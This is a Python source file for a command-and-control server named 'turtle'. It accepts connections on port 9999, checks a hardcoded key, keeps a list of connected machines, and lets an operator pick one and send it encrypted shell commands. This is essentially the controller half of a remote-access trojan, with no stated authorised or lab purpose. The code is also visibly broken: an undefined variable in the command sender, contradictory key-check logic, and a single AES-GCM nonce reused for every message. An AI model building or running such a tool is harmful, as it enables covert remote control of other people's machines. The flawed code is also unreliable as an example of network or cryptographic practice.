import commands_handler
import socket
import sys
import threading
import time
import hashlib
import json
import secrets
import string
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
# =======
#defining messaging protocol constants:
CHECK_SERVER_MSG = b'CHECK_SERVER_MSG'
SERVER_IS_UP_MSG = b'SERVER_IS_UP_MSG'
CLIENT_INIT_CONN_KEY_MSG = b'CLIENT_INIT_CONN_KEY_MSG'
KEY_EXCHANGE_SUCCEEDED_MSG = b'KEY_EXCHANGE_SUCCEEDED_MSG'
KEY_EXCHANGE_FAILED_MSG = b'KEY_EXCHANGE_FAILED_MSG'
#--
HEARTBEAT_RETRY_CONNECTION_MSG = b'HEARTBEAT_RETRY_INIT_CONNECTION_MSG'
HEARTBEAT_SUCCESS_RESPONSE_MSG = b'HEARTBEAT_SUCCESS_RESPONSE_MSG'
HEARTBEAT_NO_ACTION_MSG = b'HEARTBEAT_NO_ACTION_MSG'
HEARTBEAT_NO_ACTION_RESPONSE_MSG = b'HEARTBEAT_NO_ACTION_RESPONSE_MSG'

client_states = {}  # Dictionary to track handshake progress per client


#global variables
connections = []
addresses = []
Shutdown_Flag = threading.Event()
listen_event = threading.Event()
global current_client
current_client = None
conn_lock = threading.Lock()
key = "WHAT"
server_key_hash = hashlib.sha256(key.encode()).digest()  
COMMAND_COMMUNICATION_SECRET = b'\x9a\x7f\xee\xfd\x22\xba\x34\x55\x01\xac\x88\xff\x02\xdd\x43\x91\x9c\xba\xf4\x28\x76\x5e\xae\x0c\xda\x77\x2f\x98\xab\x19\x34\xcc'
NONCE = get_random_bytes(12)



def encrypt_command(json_payload):
    data = json.dumps(json_payload).encode()
    cipher = AES.new(COMMAND_COMMUNICATION_SECRET, AES.MODE_GCM, nonce=NONCE)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return NONCE + ciphertext + tag  



def decrypt_response(encrypted_data):
    nonce = encrypted_data[:12]
    tag = encrypted_data[-16:]
    ciphertext = encrypted_data[12:-16]
    cipher = AES.new(COMMAND_COMMUNICATION_SECRET, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode()





def sock():
    try:
        print(commands_handler.entro())
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", 9999))
        return s

    except KeyboardInterrupt:
        print("Server shutting down!\n")
        s.close()
        sys.exit(1)


### Handles the handshake and communication for a single client connection:
def handle_client(conn ,addr):
    # a message list for each client to keep track of multiple clients.
    client_states[conn] = []
    try:
        while not Shutdown_Flag.is_set():
            data = conn.recv(1024)
            if not data:
                break

            current_step = client_states[conn][-1] if client_states[conn] else None
            
            ###implementing messaging dynamic:
            if data == CHECK_SERVER_MSG:
                client_states[conn].append(CHECK_SERVER_MSG)
                conn.send(SERVER_IS_UP_MSG)
                client_states[conn].append(SERVER_IS_UP_MSG)
                print(f"[+] {addr} checked server status")

            #here we assume that client is sending the key with the "init_key" message:
            elif data.decode() == key and current_step == SERVER_IS_UP_MSG:
                #Extracting client key hash from message and comparing to server`s hash: 
                client_key_hash = data[len(CLIENT_INIT_CONN_KEY_MSG):]
                if client_key_hash == server_key_hash:
                    conn.send(KEY_EXCHANGE_SUCCEEDED_MSG)
                    client_states[conn].append(KEY_EXCHANGE_SUCCEEDED_MSG)
                    with conn_lock:
                        connections.append(conn)
                        addresses.append(addr)
                    print(f"[+] {addr} connected successfully!")
                else:
                    conn.send(KEY_EXCHANGE_FAILED_MSG)
                    print(f"[-] {addr} invalid key: {client_key}")
                    conn.close()
                    break

            elif data == HEARTBEAT_NO_ACTION_MSG:
                client_states[conn].append(HEARTBEAT_NO_ACTION_MSG)
                conn.send(HEARTBEAT_NO_ACTION_RESPONSE_MSG)
                client_states[conn].append(HEARTBEAT_NO_ACTION_RESPONSE_MSG)
                print(f"{addr} heartbeat check (no action)")

            elif data == HEARTBEAT_RETRY_CONNECTION_MSG:
                client_states[conn].append(HEARTBEAT_SUCCESS_RESPONSE_MSG)
                client_states[conn].append(SERVER_IS_UP_MSG)
                conn.send(HEARTBEAT_SUCCESS_RESPONSE_MSG)
                conn.send(SERVER_IS_UP_MSG)
                print(f"{addr} heartbeat-triggered reconnect")


            else:
                conn.send(KEY_EXCHANGE_FAILED_MSG)
                conn.close()
                break

    except Exception as e:
        print(f"[-] Error: {e}")
        conn.close()


### Accepts and manages incoming connections only after the 'listen' command is issued:
def Connection_Handling(s):
    listen_event.wait()
    s.listen(5)
    print("Listening on port: 9999")
    while not Shutdown_Flag.is_set():
        try:
            conn, addr = s.accept()
            print(f"[+] New connection from {addr}")
            # creating a thread for each client: 
            threading.Thread(target=handle_client, args=(conn, addr),daemon=True).start()
        except Exception as e:
            print(f"[-] Connection error: {e}")



### the CMD:
def turtle():
    global current_client
    while not Shutdown_Flag.is_set():
        try:
            prompt = f"{current_client} > " if current_client else "turtle > "
            cmd = input(prompt)
    
            if not cmd:
                continue
            elif cmd == "list":
                list_connections()

            elif cmd=="logo":
                commands_handler.print_logo()

            elif cmd=="listen":
                if not listen_event.is_set():
                    listen_event.set()
                
                
            elif cmd == "help":
                print(commands_handler.help_msg_func())
                
            elif cmd == "exit":
                Shutdown_Flag.set()

            elif "select" in cmd:
                try:
                    target = int(cmd.replace("select ", ""))
                    conn = connections[target]
                    current_client = addresses[target]
                except:
                    print("Invalid Client Index\n")
            elif current_client:
                with conn_lock:
                    i = addresses.index(current_client)
                    conn = connections[i]
                    send_commands(conn, cmd)
            else:
                print("Client not found!\n")
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down command interface...")
            Shutdown_Flag.set()
            break


def list_connections():
    print("--- ACTIVE CLIENTS ---")
    for i, addr in enumerate(addresses):
        print(f"{i}     {addr[0]}    {addr[1]}")



def send_commands(conn, cmd):
    try:
        
        payload = {
            "ID": 123422,
            "command": command
        }

        encrypted_payload = encrypt_command(payload)
        conn.send(encrypted_payload)


        response_data = recv_all(conn)
        decrypted = decrypt_response(response_data)
        print(decrypted, end='')

    

    except (ConnectionResetError, BrokenPipeError):
        print("Client disconnected!")
        with conn_lock:
            if conn in connections:
                index = connections.index(conn)
                global current_client
                if current_client == addresses[index]:
                    current_client = None
                del connections[index]
                del addresses[index]
    except Exception as e:
        print(f"Error sending command: {e}")
        raise



def recv_all(conn):
    data = b''
    while True:
        packet = conn.recv(4096)
        if not packet:
            break
        data += packet
    return data


### Cleans up all active client connections and closes the server socket:
def cleanup(sock):
    with conn_lock:
        for conn in connections:
            conn.close()
    sock.close()

def main():
    s = sock()
    conn_thread = threading.Thread(target=Connection_Handling, args=(s,),daemon=True)
    conn_thread.start()
    try:
        turtle()
    finally:
        Shutdown_Flag.set()
        cleanup(s)

main()



